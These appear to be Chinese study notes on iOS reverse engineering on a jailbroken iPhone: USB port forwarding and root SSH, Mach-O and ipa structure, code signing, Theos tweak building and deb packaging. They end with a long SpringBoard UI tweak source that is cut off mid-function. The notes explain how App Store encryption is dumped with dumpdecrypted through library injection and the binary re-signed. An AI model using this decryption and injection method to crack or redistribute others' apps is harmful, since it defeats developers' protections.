下载usbmuxd工具包，下载v1.0.8版本，主要用到里面的一个python脚本： tcprelay.py, 下载链接
将iphone的22端口（SSH端口）映射到Mac本地的10010端口
cd ~/Documents/usbmux-1.08/python-client
python tcprelay.py -t 22:10010
加上 -t 参数是为了能够同时支持多个SSH连接，端口映射完毕后，以后如果想跟iphone的22端口通信，直接跟Mac本地的10010端口通信就可以了，新开一个终端界面，SSH登录到Mac本地的10010端口，usbmuxd会将Mac本地10010端口的TCP协议数据，通过USB连接转发到iphone的22 端口，远程拷贝文件也可以直接跟Mac本地的10010端口通信，如：scp -p 10010 ~/Desktop/1.txt root@localhost:~/test 将Mac上的/Desktop/1.txt文件，拷贝到iphone上的/test路径。
先开一个终端，先完成端口映射
*cd 到usbmuxd文件夹路径
python tcprelay.py -t 22:10010

15237725002208.jpg
再开一个端口
注入手机
ssh root@localhost -p 10010
:~ root# cycript -p SpringBoard

## 切记第一个终端不可以关闭，才可以保持端口映射状态

# ipa内容介绍

首先来介绍下ipa包。ipa实际上是一个压缩包，我们从App Store下载的应用实际上都是压缩包。压缩包中包含.app的文件，.app文件实际上是一个带后缀的文件夹。在app中，存在如下文件：
1）资源文件
资源文件包括我们常用的内置文件，如图片、plist以及生成的.car文件等。
2）可执行程序
可执行程序是最核心的文件，除了代码和数据外，里面包含code signature和ENCRYPTION。
 
 
是code signature和ENCRYPTION在LoadCommad中的索引。展开ENCRYPTION后可以看到ENCRYPTION的偏移地址和大小。Crypt ID标记该Mach-O文件是否被加密，如果加密则Crypt ID = 1，否则为0。
 
## 那么这个ENCRYPTION是什么？谁负责加密的？谁负责解密的？如果文件没有加密是否还能被运行？

实际上加密的ENCRYPTION就是我们所说的壳，砸壳就是将ENCRYPTION进行解密操作。从上面的截图我们可以看出，ENCRYPTION的起始偏移地址为文件的0x4000位置，而结束位置可以计算出为0x4000+0x424000 = 0x428000。这个范围正好对应着Mach-O的文本段（不是1:1的，起始位置0x4000，而不是0x0）。也就是说加密实际上是对TEXT段进行加密。TEXT内存储的是代码信息，包括函数指令、类名、方法名、字符串信息等。

对TEXT进行加密，加密后的Mach-O文件无法获取到代码信息，也就是说指令信息我们无法直接获取到了。除了指令外，在DATA段中，有些数据存储的是指针信息，指向TEXT段的数据，这样的数据也无法解析出来。
 
加壳之后的应用，在不解密的情况下，无法暴露指令和文本数据，这能很好地保护应用。这个壳是在上传到App Store由App Store进行加密的，用户下载的应用也是被加壳的应用。存储在手机的文件也是被加密的，只有在应用运行时，iOS才会对文件进行解密，也就是说在用户手机上运行的文件都是解密脱壳后的文件。我们在进行真机调试时，安装到手机上的文件是未加密的，这个时候Crypt ID标记为0。iOS系统在识别Crypt ID为0时不会进行解密处理。
3）code signature
 
code signature 包含资源文件的签名信息，如果资源文件被更改替换，那么签名是无法验证通过的。因此下载XIB等方式实现UI的动态布局是无法实现的。那么这里的code signature与Mach-O文件里的signature是一样的吗？当然是不一样的。这里的签名验证的是资源文件，而Mach-O文件中的code signature 是验证Mach-O是否被篡改以及是否是apple允许安装的应用。
三、dumpdecrypted砸壳原理简介
砸壳的技术方案可以分为两种，一种是静态砸壳，一种是动态砸壳。静态砸壳的原理是硬破解apple的加密算法，目前是一种使用频率极低的技术方案。动态砸壳是利用iOS将文件解密后加载到内存后，将解密数据拷贝到磁盘的方案。动态砸壳目前成熟的方案很多，在这里介绍下dumpdecrypted的方式。
dumpdecrypted是以动态库的方式，将代码注入到目标进程中。那么如何让一个应用程序在运行时加载我们的动态库呢？目前的方案主要有两种：
1）修改Mach-O文件，在LC中，添加LC_LOAD_DYLIB信息，然后重签名运行。
这需要开发者对Mach-O文件有足够的了解，否则很容易损毁文件。不过已经有相应的工具：https://github.com/Tyilo/insert_dylib

2）通过在手机的终端输入DYLD_INSERT_LIBRARIES="动态库"  APP路径  命令（这就要求手机必须是越狱的），指定应用加载动态库，dumpdecrypted采用的就是这种方式。
DYLD_INSERT_LIBRARIES是系统的环境变量。通过在终端输入man dyld 可以查看环境变量及其解释。DYLD_INSERT_LIBRARIES的解释如下：

除了DYLD_INSERT_LIBRARIES变量外，我们可以打印看到还有许多环境变量，
 
这些变量的解释和用处都在终端中有说明，在此不再一一解释。额外提一句，我们可以在应用中通过getenv函数检测是否存在环境变量，这可以作为安全监测数据。
在动态库被加载后，标记为__attribute__((constructor))的函数会被执行。启动函数执行后，核心步骤只做3件事
1）在加密的原文件中复制从起始位置开始的未加密的数据。
2）从内存中的文件复制解密的数据。
3）在加密原文件中跳过加密部分，拷贝剩余未加密数据。
 


这3件事做完后，应用程序脱壳就完成了。在阅读代码时，我有两个问题：
1）函数为什么指定成
void dumptofile(int argc, const char **argv, const char **envp, const char **apple, struct ProgramVars *pvars)类型？
后来发现实际上这是__attribute__((constructor))固定的函数类型，5个参数分别代表了(参数个数，参数列表，环境变量，可执行程序路径，文件信息)。
2）如何获取应用在磁盘的路径？
argv[0]，也就是参数列表的第一个，代表的是可执行文件的路径。这与main函数类似。通过apple也可以获取到文件路径，dumpdecrypted使用的是argv[0]。
 
# 四、重签名
在脱壳后，只能保证Mach-O文件变成可读的，即函数指令和字符信息能暴露出来，但是此时的文件并不能运行。这是由于apple除了做代码可读化的加密外，还做了签名验证，从而保证在iOS系统中成功运行的程序都是被苹果校验过的，被篡改的或其他的渠道程序不能被加载。因此需要对砸壳后的文件进行重签名。
1）签名的作用
在应用ipa内，存在多处签名，不同的签名有不同的作用。但是这些签名整体目的只有一个：所有安装和运行的APP必须是苹果允许的。也就是说，在安装时iOS会验证一些文件的签名，在启动时iOS系统也会验证一部分文件的签名。
2）签名文件
从App Store下载的应用验证最简单，只要iOS系统用公钥验证APP 在App Store后台用私钥生成的签名即可。但是我们开发过程中的真机调试是如何进行签名验证呢？
签名的秘钥一共有两对，针对这些步骤我们来一步步解释这些步骤在什么时候操作的，如何操作的以及形式是什么。
首先，两对秘钥中，App Store 的私钥和iOS系统内部的公钥我们接触不到，因此不做解释。但是Mac 中的公钥和私钥我们确实使用过。
MAC 公钥：公钥即是我们在钥匙串中申请的.certSigningRequest文件。
MAC 私钥：在申请certSigningRequest文件文件时生成的配对的私钥，保存在本地电脑中。
证书生成：证书生成对应图中步骤3，我们将MAC的公钥上传到苹果后台通过苹果的私钥进行签名，签名后生成的文件即是开发者证书。
描述文件：由于苹果要限制安装的设备、安装的APP以及所具备的权限（如推送），苹果将这些信息连同证书合并再签名得到的文件就是描述文件。描述文件在开发阶段存放在APP包内，文件名为embedded.mobileprovision。至此，我们可以知道已经存在两处签名了，1是苹果对本地公钥的签名，2是对证书描述文件的签名，这两处签名都是App Store的私钥进行签名的。
在通过Xcode打包时，Xcode会通过本地私钥对APP进行签名，这个签名上图中表现出一部分，实际上签名有两处：一处是对资源进行签名，也就是说ipa内所有的资源文件包括xib、png等都需要进行签名，签名存放在code signature中。另一处签名是针对代码的签名（这个签名不是加密壳），ipa内的Mach-O文件的code signature存放着打包时的签名信息。
3、验证流程
有了这么多的签名，那么这些签名是在什么时候进行验证的呢？验证分两个步骤进行，分别是安装时验证和启动时验证。
1）安装时验证
在安装时，iOS系统会取出code signature验证各个资源文件的签名。如果资源文件都验证通过，那么取出embedded.mobileprovision，验证设备ID，如果该设备在设备列表中并且相符，那么安装成功。但是INHOUSE 版本和 App Store版的APP不需要验证embedded.mobileprovision。（因为不存在这个文件，这是由于发布市场不需要放开验证权限，与你的Mac和iPhone无关，所以也就不需要你的公钥）
2）启动时验证
验证bundle id 与embedded.mobileprovision中的APPID是否一致，验证entitlements与embedded.mobileprovision的entitlements是否一致。如果一致则尝试将执行可执行程序。在iOS内核执行execve函数调用Mach-O可执行文件之前，会先获取Mach-O的code signature。那么code signature里到底存的啥？可以通过codesign -dvvvvv 查看Mach-O的code signature，里面存的都是签名信息。
 
五、iOS应用包扫描
在我们ipa包提交到苹果审核后，苹果会通过代码扫描我们应用程序所使用到的API。那么苹果根据我们提交的应用包，能扫描到什么内容呢？
1、示例
符号信息在打包时存储在两个Mach-O文件中：1、可执行程序。2、DSYM文件。可执行程序中存在类相关信息及动态链接相关符号。DSYM是在打包时从可执行文件中剥离出来的Mach-O文件，包含静态链接相关符号、代码路径等完备信息。如果打包时不选用苹果自带的崩溃统计工具，DSYM只上传给buggly使用。苹果所能扫描的只有资源文件以及可执行程序。但是除了可执行程序除了符号信息外，还包含其他信息。
1）扫描类信息
类关键信息包括类名、方法名、方法描述（参数、返回值类型等）、类是否被使用、方法是否被使用。
 
可以知道函数的返回值类型是什么，参数类型是什么，参数有多少，但是参数的命名获取不到（NSString*） name，这个name获取不到。

还能知道有哪些类被使用过，包括系统的类已经自己的声明的类。但是通过XIB 绑定的类不会被加入到classref。字符串动态调用的类也不被加入。
2）扫描动态链接符号
动态链接符号包括动态库的函数、变量、私有函数。

扫描符号可以通过nm 命令快速扫描输出到文件
 

U代表是未定义符号（动态库中的函数），而T表示的是符号定义在Text段（自己写的函数）。
 
3）扫描字符串
字符串包括：OC字符串和C字符串

使用到的@"%.2f"，@“backgroundStar”等

# Mach-O总结
Mach-O文件的作用其实跟打孔纸带的作用是一样的，只不过Mach-O文件描述的内容更加丰富。
除了代码和数据外，Mach-O还包含了加密、验证这样的机制，使得代码更加安全。

# theos 的一些事

( Logos is a component of the Theos development suite that allows method hooking code to be written easily and clearly, using a set of special preprocessor directives. )
Logos是Theos开发套件的一个组件，该套件允许使用一组特殊的预处理程序指令轻松而清晰地编写方法挂钩代码。

This is an [Logos 语法介绍](http://iphonedevwiki.net/index.php/Logos").

// 使用-switch选项可将系统上的Xcode更改为另一个版本：
$ sudo xcode-select --switch /Applications/Xcode.app
$ sudo xcode-select -switch /Applications/Xcode.app

安装命令
```
$ export THEOS=/opt/theos        
$ sudo git clone git://github.com/DHowett/theos.git $THEOS
```

安装ldid 签名工具
```
http://joedj.net/ldid  然后复制到/opt/theos/bin 
然后sudo chmod 777 /opt/theos/bin/ldid
```

配置CydiaSubstrate
用iTools,将iOS上
```
/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate
```
拷贝到电脑上, 然后改名为libsubstrate.dylib , 然后拷贝到/opt/theos/lib 中.

安装神器dkpg
```
$ sudo port install dpkg
```
//不需要再下载那个dpkg-deb了

增加nic-templates(可选)
```
从 https://github.com/DHowett/theos-nic-templates 下载 
```
然后将解压后的5个.tar放到/opt/theos/templates/ios/下即可

# 创建deb tweak

/opt/theos/bin/nic.pl
```
NIC 1.0 - New Instance Creator
——————————
  [1.] iphone/application
  [2.] iphone/library
  [3.] iphone/preference_bundle
  [4.] iphone/tool
  [5.] iphone/tweak
Choose a Template (required): 1
Project Name (required): firstdemo
Package Name [com.yourcompany.firstdemo]: 
Author/Maintainer Name [Author Name]: 
Instantiating iphone/application in firstdemo/…
Done.
```
选择 [5.] iphone/tweak
```
Project Name (required): Test
Package Name [com.yourcompany.test]: com.test.firstTest
Author/Maintainer Name [小伍]: xiaowu
[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]: com.apple.springboard
[iphone/tweak] List of applications to terminate upon installation (space-separated, '-' for none) [SpringBoard]: SpringBoard
```
第一个相当于工程文件夹的名字
第二个相当于bundle id
第三个就是作者
第四个是作用对象的bundle identifier
第五个是要重启的应用
b.修改Makefile
```
TWEAK_NAME = iOSRE
iOSRE_FILES = Tweak.xm
include $(THEOS_MAKE_PATH)/tweak.mk
THEOS_DEVICE_IP = 192.168.1.34
iOSRE_FRAMEWORKS=UIKit Foundation
ARCHS = arm64
```
上面的ip必须写, 当然写你测试机的ip , 然后archs 写你想生成对应机型的型号

c.便携Tweak.xm
```
#import <UIKit/UIKit.h>
#import <SpringBoard/SpringBoard.h>

%hook SpringBoard

-(void)applicationDidFinishLaunching:(id)application {

UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Welcome"
message:@"Welcome to your iPhone!"
delegate:nil
cancelButtonTitle:@"Thanks"
otherButtonTitles:nil];
[alert show];
[alert release];
%orig;

}

%end
```
你默认的Tweak.xm里面的代码都是被注销的

d.设置环境变量
打开terminal输入
```
export THEOS=/opt/theos/
export THEOS_DEVICE_IP=xxx.xxx.xxx.xxx(手机的ip地址)
```
3.构建工程

第一个命令:make

```
$ make
Making all for application firstdemo…
 Compiling main.m…
 Compiling firstdemoApplication.mm…
 Compiling RootViewController.mm…
 Linking application firstdemo…
 Stripping firstdemo…
 Signing firstdemo…
 ```
第二个命令:make package
```
make package
Making all for application firstdemo…
make[2]: Nothing to be done for ‘internal-application-compile’.
Making stage for application firstdemo…
 Copying resource directories into the application wrapper…
dpkg-deb: building package ‘com.yourcompany.firstdemo’ in ‘/Users/author/Desktop/firstdemo/com.yourcompany.firstdemo_0.0.1-1_iphoneos-arm.deb’.
```

第三个命令: make package install
```
$ make package install
Making all for application firstdemo…
make[2]: Nothing to be done for `internal-application-compile’.
Making stage for application firstdemo…
 Copying resource directories into the application wrapper…
dpkg-deb: building package ‘com.yourcompany.firstdemo’ in ‘/Users/author/Desktop/firstdemo/com.yourcompany.firstdemo_0.0.1-1_iphoneos-arm.deb’.
...
root@ip’s password: 
...
```
# 过程会让你输入两次iphoen密码 , 默认是alpine

** 当然你也可以直接 make package install 一步到位, 直接编译, 打包, 安装一气呵成**

# 说一说 遇到的坑
1.在 环境安装 的第二步骤 下载theos , 下载好的theos有可能是有问题的

 /opt/theos/vendor/  里面的文件是否是空的? 仔细检查 否则在make编译的时候回报一个 什么vendor 的错误
2.如果在make成功之后还想make 发现报了Nothing to be done for `internal-library-compile’错误

那就把你刚才创建出来的obj删掉和packages删掉 , 然后显示隐藏文件, 你就会发现和obj同一个目录有一个.theos , 吧.theos里面的东西删掉就好了
3.简单总结下

基本问题就一下几点:
1.代码%hook ClassName 没有修改
2.代码没调用头文件
3.代码注释没有解开(代码写错)
4.makefile里面东西写错
5.makefile里面没有写ip地址
6.没有配置环境地址
7.遇到路径的问题你就 export THEOS_DEVICE_IP=192.168.1.34
8.遇到路径问题你就THEOS=/opt/theos 

# 插件开发(.xm)

dpkg -i package.deb               #安装包
dpkg -r package                      #删除包
dpkg -P package                     #删除包（包括配置文件）
dpkg -L package                     #列出与该包关联的文件
dpkg -l package                      #显示该包的版本
dpkg --unpack package.deb  #解开deb包的内容
dpkg -S keyword                    #搜索所属的包内容
dpkg -l                                    #列出当前已安装的包
dpkg -c package.deb             #列出deb包的内容
dpkg --configure package     #配置包

## deb 大概结构
其中包括：DEBIAN目录 和 软件具体安装目录（模拟安装目录）（如etc, usr, opt, tmp等）。
在DEBIAN目录中至少有control文件，还可能有postinst(postinstallation)、postrm(postremove)、preinst(preinstallation)、prerm(preremove)、copyright (版权）、changlog （修订记录）和conffiles等。

postinst文件：包含了软件在进行正常目录文件拷贝到系统后，所需要执行的配置工作。
prerm文件：软件卸载前需要执行的脚本。
postrm文件：软件卸载后需要执行的脚本。
control文件：这个文件比较重要，它是描述软件包的名称（Package），版本（Version），描述（Description）等，是deb包必须剧本的描述性文件，以便于软件的安装管理和索引。
其中可能会有下面的字段：
-- Package 包名
-- Version 版本
-- Architecture：软件包结构，如基于i386, amd64,m68k, sparc, alpha, powerpc等
-- Priority：申明软件对于系统的重要程度，如required, standard, optional, extra等
-- Essential：申明是否是系统最基本的软件包（选项为yes/no），如果是的话，这就表明该软件是维持系统稳定和正常运行的软件包，不允许任何形式的卸载（除非进行强制性的卸载）
-- Section：申明软件的类别，常见的有utils, net, mail, text, devel 等
-- Depends：软件所依赖的其他软件包和库文件。如果是依赖多个软件包和库文件，彼此之间采用逗号隔开
-- Pre-Depends：软件安装前必须安装、配置依赖性的软件包和库文件，它常常用于必须的预运行脚本需求
-- Recommends：这个字段表明推荐的安装的其他软件包和库文件
-- Suggests：建议安装的其他软件包和库文件
-- Description：对包的描述
-- Installed-Size：安装的包大小
-- Maintainer：包的制作者，联系方式等
我的测试包的control：

Package: kellan-test
Version: 1.0
Architecture: all
Maintainer: Kellan Fan
Installed-Size: 128
Recommends:
Suggests:
Section: devel
Priority: optional
Multi-Arch: foreign
Description: just for test
三 制作包
制作包其实很简单，就一条命令
dpkg -b <包目录> <包名称>.deb

四 其他命令
安装
dpkg -i xxx.deb
卸载
dpkg -r xxx.deb
解压缩包
dpkg -X xxx.deb [dirname]

```
$ dpkg -b /Users/mac/Desktop/debPath debName.deb
dpkg-deb: 正在 'x.deb' 中构建软件包 'com.gtx.gtx'。
```
```
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

#define kBundlePath @"/Library/Application Support/Neptune"

BOOL isFluidInterfaceEnabled;
long _homeButtonType = 1;
BOOL isHomeIndicatorEnabled;
BOOL isButtonCombinationOverrideDisabled;
BOOL isTallKeyboardEnabled;
BOOL isPIPEnabled;
int  statusBarStyle;
BOOL isWalletEnabled;
BOOL isNewsIconEnabled;
BOOL prototypingEnabled = NO;

@interface CALayer (CornerAddition)
-(bool)continuousCorners;
@property (assign) bool continuousCorners;
-(void)setContinuousCorners:(bool)arg1;
@end

/// MARK: - Group: Button remap
%group ButtonRemap

// Siri remap
%hook SBLockHardwareButtonActions
- (id)initWithHomeButtonType:(long long)arg1 proximitySensorManager:(id)arg2 {
    return %orig(_homeButtonType, arg2);
}
%end

%hook SBHomeHardwareButtonActions
- (id)initWitHomeButtonType:(long long)arg1 {
    return %orig(_homeButtonType);
}
%end

// Screenshot remap
int applicationDidFinishLaunching;

%hook SpringBoard
-(void)applicationDidFinishLaunching:(id)application {
    applicationDidFinishLaunching = 2;
    %orig;
}
%end

%hook SBPressGestureRecognizer
- (void)setAllowedPressTypes:(NSArray *)arg1 {
    NSArray * lockHome = @[@104, @101];
    NSArray * lockVol = @[@104, @102, @103];
    if ([arg1 isEqual:lockVol] && applicationDidFinishLaunching == 2) {
        %orig(lockHome);
        applicationDidFinishLaunching--;
        return;
    }
    %orig;
}
%end

%hook SBClickGestureRecognizer
- (void)addShortcutWithPressTypes:(id)arg1 {
    if (applicationDidFinishLaunching == 1) {
        applicationDidFinishLaunching--;
        return;
    }
    %orig;
}
%end

%hook SBHomeHardwareButton
- (id)initWithScreenshotGestureRecognizer:(id)arg1 homeButtonType:(long long)arg2 buttonActions:(id)arg3 gestureRecognizerConfiguration:(id)arg4 {
    return %orig(arg1,_homeButtonType,arg3,arg4);
}
- (id)initWithScreenshotGestureRecognizer:(id)arg1 homeButtonType:(long long)arg2 {
    return %orig(arg1,_homeButtonType);
}
%end

%hook SBLockHardwareButton
- (id)initWithScreenshotGestureRecognizer:(id)arg1 shutdownGestureRecognizer:(id)arg2 proximitySensorManager:(id)arg3 homeHardwareButton:(id)arg4 volumeHardwareButton:(id)arg5 buttonActions:(id)arg6 homeButtonType:(long long)arg7 createGestures:(_Bool)arg8 {
    return %orig(arg1,arg2,arg3,arg4,arg5,arg6,_homeButtonType,arg8);
}
- (id)initWithScreenshotGestureRecognizer:(id)arg1 shutdownGestureRecognizer:(id)arg2 proximitySensorManager:(id)arg3 homeHardwareButton:(id)arg4 volumeHardwareButton:(id)arg5 homeButtonType:(long long)arg6 {
    return %orig(arg1,arg2,arg3,arg4,arg5,_homeButtonType);
}
%end

%hook SBVolumeHardwareButton
- (id)initWithScreenshotGestureRecognizer:(id)arg1 shutdownGestureRecognizer:(id)arg2 homeButtonType:(long long)arg3 {
    return %orig(arg1,arg2,_homeButtonType);
}
%end

%end

%group ControlCenter122UI

// MARK: Control Center media controls transition (from iOS 12.2 beta)
@interface MediaControlsRoutingButtonView : UIView
- (long long)currentMode;
@end

long currentCachedMode = 99;

static CALayer* playbackIcon;
static CALayer* AirPlayIcon;
static CALayer* platterLayer;

%hook MediaControlsRoutingButtonView
- (void)_updateGlyph {

    if (self.currentMode == currentCachedMode) { return; }

    currentCachedMode = self.currentMode;

    if (self.layer.sublayers.count >= 1) {
        if (self.layer.sublayers[0].sublayers.count >= 1) {
            if (self.layer.sublayers[0].sublayers[0].sublayers.count == 2) {

                playbackIcon = self.layer.sublayers[0].sublayers[0].sublayers[1].sublayers[0];
                AirPlayIcon = self.layer.sublayers[0].sublayers[0].sublayers[1].sublayers[1];
                platterLayer = self.layer.sublayers[0].sublayers[0].sublayers[1];

                if (self.currentMode == 2) { // Play/Pause Mode

                    // Play/Pause Icon
                    playbackIcon.speed = 0.5;

                    UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:1 dampingRatio:1 animations:^{
                        playbackIcon.transform = CATransform3DMakeScale(-1, -1, 1);
                        playbackIcon.opacity = 0.75;
                    }];
                    [animator startAnimation];

                    // AirPlay Icon
                    AirPlayIcon.speed = 0.75;

                    UIViewPropertyAnimator *animator2 = [[UIViewPropertyAnimator alloc] initWithDuration:1 dampingRatio:1 animations:^{
                        AirPlayIcon.transform = CATransform3DMakeScale(0.85, 0.85, 1);
                        AirPlayIcon.opacity = -0.75;
                    }];
                    [animator2 startAnimation];

                    platterLayer.backgroundColor = [[UIColor colorWithRed:0 green:0.478 blue:1.0 alpha:0.0] CGColor];

                } else if (self.currentMode == 0 || self.currentMode == 1) { // AirPlay Mode

                    // Play/Pause Icon
                    playbackIcon.speed = 0.75;

                    UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:1 dampingRatio:1 animations:^{
                        playbackIcon.transform = CATransform3DMakeScale(-0.85, -0.85, 1);
                        playbackIcon.opacity = -0.75;
                    }];
                    [animator startAnimation];

                    // AirPlay Icon
                    AirPlayIcon.speed = 0.5;

                    UIViewPropertyAnimator *animator2 = [[UIViewPropertyAnimator alloc] initWithDuration:1 dampingRatio:1 animations:^{
                        AirPlayIcon.transform = CATransform3DMakeScale(1, 1, 1);
                        if (self.currentMode == 0) {
                            AirPlayIcon.opacity = 0.75;
                            platterLayer.backgroundColor = [[UIColor colorWithRed:0 green:0.478 blue:1.0 alpha:0.0] CGColor];
                        } else if (self.currentMode == 1) {
                            AirPlayIcon.opacity = 1;
                            platterLayer.backgroundColor = [[UIColor colorWithRed:0 green:0.478 blue:1.0 alpha:1.0] CGColor];
                            platterLayer.cornerRadius = 18;
                        }
                    }];
                    [animator2 startAnimation];
                }
            }
        }
    }
}
%end

%end

%group SBButtonRefinements

// MARK: App icon selection override

long _iconHighlightInitiationSkipper = 0;

@interface SBIconView : UIView
- (void)setHighlighted:(bool)arg1;
@property(nonatomic, getter=isHighlighted) _Bool highlighted;
@end

%hook SBIconView
- (void)setHighlighted:(bool)arg1 {

    if (_iconHighlightInitiationSkipper) {
        %orig;
        return;
    }

    if (arg1 == YES) {

        if (!self.highlighted) {
            _iconHighlightInitiationSkipper = 1;
            %orig;
            %orig(NO);
            _iconHighlightInitiationSkipper = 0;
        }

        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.125 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    } else {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.3 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    }
    return;
}
%end

@interface NCToggleControl : UIView
- (void)setHighlighted:(bool)arg1;
@end

%hook NCToggleControl
- (void)setHighlighted:(bool)arg1 {
    if (arg1 == YES) {

        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.125 curve:UIViewAnimationCurveEaseOut animations:^{
            %orig;
        }];
        [animator startAnimation];
    } else {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.5 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    }
    return;
}
%end


@interface SBEditingDoneButton : UIView
- (void)setHighlighted:(bool)arg1;
@end

%hook SBEditingDoneButton
-(void)layoutSubviews {
    %orig;

    if (!self.layer.masksToBounds) {
        self.layer.continuousCorners = YES;
        self.layer.masksToBounds = YES;
        self.layer.cornerRadius = 13;
    }

    /*
     CGRect _frame = self.frame;

     if (_frame.origin.y != 16) {
     _frame.origin.y = 16;
     self.frame = _frame;
     }*/
}
- (void)setHighlighted:(bool)arg1 {
    if (arg1 == YES) {

        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.1 curve:UIViewAnimationCurveEaseOut animations:^{
            %orig;
        }];
        [animator startAnimation];
    } else {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.5 dampingRatio:1 animations:^{
            %orig;
        }];
        [animator startAnimation];
    }
    return;
}
%end

@interface SBFolderIconBackgroundView : UIView
@end

%hook SBFolderIconBackgroundView
- (void)layoutSubviews {
    %orig;
    self.layer.continuousCorners = YES;
}
%end
/*
 @interface SBFolderIconImageView : UIView
 @end

 %hook SBFolderIconImageView
 - (void)layoutSubviews {
 if (!self.layer.masksToBounds) {
 self.layer.continuousCorners = YES;
 self.layer.masksToBounds = YES;
 self.layer.cornerRadius = 13.5;
 }
 return %orig;
 }
 %end
 */

// MARK: Widgets screen button highlight
@interface WGShortLookStyleButton : UIView
- (void)setHighlighted:(bool)arg1;
@end

%hook WGShortLookStyleButton
- (void)setHighlighted:(bool)arg1 {
    if (arg1 == YES) {

        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.25 dampingRatio:1 animations:^{
            self.alpha = 0.6;
        }];
        [animator startAnimation];
    } else {
        UIViewPropertyAnimator *animator = [[UIViewPropertyAnimator alloc] initWithDuration:0.6 dampingRatio:1 animations:^{
            self.alpha = 1;
        }];
        [animator startAnimation];
    }
    return;
}
%end

%end

/// MARK: - Group: Springboard modifications
%group FluidInterface

// MARK: Enable fluid switcher
%hook BSPlatform
- (NSInteger)homeButtonType {
    return 2;
}
%end

// MARK: Lock screen quick action toggle implementation

// Define custom springboard method to remove all subviews.
@interface UIView (SpringBoardAdditions)
- (void)sb_removeAllSubviews;
@end

@interface SBDashBoardQuickActionsView : UIView
@end

// Reinitialize quick action toggles
%hook SBDashBoardQuickActionsView
- (void)_layoutQuickActionButtons {

    %orig;
    for (UIView *subview in self.subviews) {
        if (subview.frame.size.width < 50) {
            if (subview.frame.origin.x < 50) {
                CGRect _frame = subview.frame;
                _frame = CGRectMake(46, _frame.origin.y - 90, 50, 50);
                subview.frame = _frame;
                [subview sb_removeAllSubviews];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunused-value"
                [subview init];
#pragma clang diagnostic pop
            } else if (subview.frame.origin.x > 100) {
                CGFloat _screenWidth = subview.frame.origin.x + subview.frame.size.width / 2;
                CGRect _frame = subview.frame;
                _frame = CGRectMake(_screenWidth - 96, _frame.origin.y - 90, 50, 50);
                subview.frame = _frame;
                [subview sb_removeAllSubviews];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wunused-value"
                [subview init];
#pragma clang diagnostic pop
            }
        }
    }
}
%end

// MARK: Cover sheet control centre grabber initialization
typedef enum {
    Tall=0,
    Regular=1
} NEPStatusBarHeightStyle;

NEPStatusBarHeightStyle _statusBarHeightStyle = Tall;

@interface SBDashBoardTeachableMomentsContainerView : UIView
@property(retain, nonatomic) UIView *controlCenterGrabberView;
@property(retain, nonatomic) UIView *controlCenterGrabberEffectContainerView;
@end

%hook SBDashBoardTeachableMomentsContainerView
- (void)layoutSubviews {
    %orig;

    if (_statusBarHeightStyle == Tall) {
        self.controlCenterGrabberEffectContainerView.frame = CGRectMake(self.frame.size.width - 73,36,46,2.5);
        self.controlCenterGrabberView.frame = CGRectMake(0,0,46,2.5);
    } else if (@available(iOS 12.1, *)) {
        // Rounded status bar visual provider
        self.controlCenterGrabberEffectContainerView.frame = CGRectMake(self.frame.size.width - 85.5,26,60.5,2.5);
        self.controlCenterGrabberView.frame = CGRectMake(0,0,60.5,2.5);
    } else {
        // Non-rounded status bar visual provider
        self.controlCenterGrabberEffectContainerView.frame = CGRectMake(self.frame.size.width - 75.5,24,60.5,2.5);
        self.controlCenterGrabberView.frame = CGRectMake(0,0,60.5,2.5);
    }
}
%end

// MARK: Corner radius implementation
@interface _UIRootWindow : UIView
@property (setter=_setContinuousCornerRadius:, nonatomic) double _continuousCornerRadius;
- (double)_continuousCornerRadius;
- (void)_setContinuousCornerRadius:(double)arg1;
@end

// Implement system wide continuousCorners.
%hook _UIRootWindow
- (void)layoutSubviews {
    %orig;
    self._continuousCornerRadius = 5;
    self.clipsToBounds = YES;
    return;
}
%end

// Implement corner radius adjustment for when in the app switcher scroll view.
/*%hook SBDeckSwitcherPersonality
- (double)_cardCornerRadiusInAppSwitcher {
    return 17.5;
}
%end*/

// Implement round screenshot preview edge insets.
%hook UITraitCollection
+ (id)traitCollectionWithDisplayCornerRadius:(CGFloat)arg1 {
    return %orig(17);
}
%end

@interface SBAppSwitcherPageView : UIView
@property(nonatomic, assign) double cornerRadius;
@property(nonatomic) _Bool blocksTouches;
- (void)_updateCornerRadius;
@end

BOOL blockerPropagatedEvent = false;
double currentCachedCornerRadius = 0;

/// IMPORTANT: DO NOT MESS WITH THIS LOGIC. EVERYTHING HERE IS DONE FOR A REASON.

// Override rendered corner radius in app switcher page, (for anytime the fluid switcher gestures are running).
%hook SBAppSwitcherPageView

-(void)setBlocksTouches:(BOOL)arg1 {
    if (!arg1 && (self.cornerRadius == 17 || self.cornerRadius == 5 || self.cornerRadius == 3.5)) {
        blockerPropagatedEvent = true;
        self.cornerRadius = 5;
        [self _updateCornerRadius];
        blockerPropagatedEvent = false;
    } else if (self.cornerRadius == 17 || self.cornerRadius == 5 || self.cornerRadius == 3.5) {
        blockerPropagatedEvent = true;
        self.cornerRadius = 17;
        [self _updateCornerRadius];
        blockerPropagatedEvent = false;
    }

    %orig(arg1);
}

- (void)setCornerRadius:(CGFloat)arg1 {

    currentCachedCornerRadius = MSHookIvar<double>(self, "_cornerRadius");

    CGFloat arg1_overwrite = arg1;

    if ((arg1 != 17 || arg1 != 5 || arg1 != 0) && self.blocksTouches) {
